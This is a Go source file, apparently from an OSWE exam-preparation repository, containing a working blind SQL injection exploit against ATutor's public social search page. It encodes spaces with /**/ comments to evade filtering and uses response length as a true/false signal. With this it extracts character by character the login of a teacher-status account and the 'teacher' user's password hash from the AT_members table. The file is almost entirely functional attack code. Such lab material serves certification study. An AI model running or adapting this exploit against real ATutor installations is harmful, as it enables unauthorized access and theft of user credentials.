package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Ex 3.6.1.1 - Retrieving teacher's credentials

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiV4(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

// test')/**/or/**/(select/**/length((select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1)))=7%23
func getLength(ip string, subquery string, lower, upper int) int {
	for i := lower; i < upper; i++ {
		updatedPayload := fmt.Sprintf("test')/**/or/**/(select/**/length((%s)))=%d%%23", subquery, i)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	//debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) != 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	usernameQuery := "select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1"
	userLen := getLength(ip, usernameQuery, 1, 10)
	utils.PrintInfo(fmt.Sprintf("Length of username: %d", userLen))

	utils.PrintInfo("Extracting username: ")
	for i := 1; i < userLen+1; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23", usernameQuery, i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiV4(ip, sqliPayload))
		fmt.Print(extractedChar)
	}

	fmt.Print("\n")

	passwordQuery := "select/**/password/**/from/**/AT_members/**/where/**/status=3/**/and/**/login='teacher'"
	passwordLen := getLength(ip, passwordQuery, 30, 50)
	utils.PrintInfo(fmt.Sprintf("Length of password: %d", passwordLen))

	utils.PrintInfo("Extracting password hash: ")
	for i := 1; i < passwordLen+1; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23", passwordQuery, i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiV4(ip, sqliPayload))
		fmt.Print(extractedChar)
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
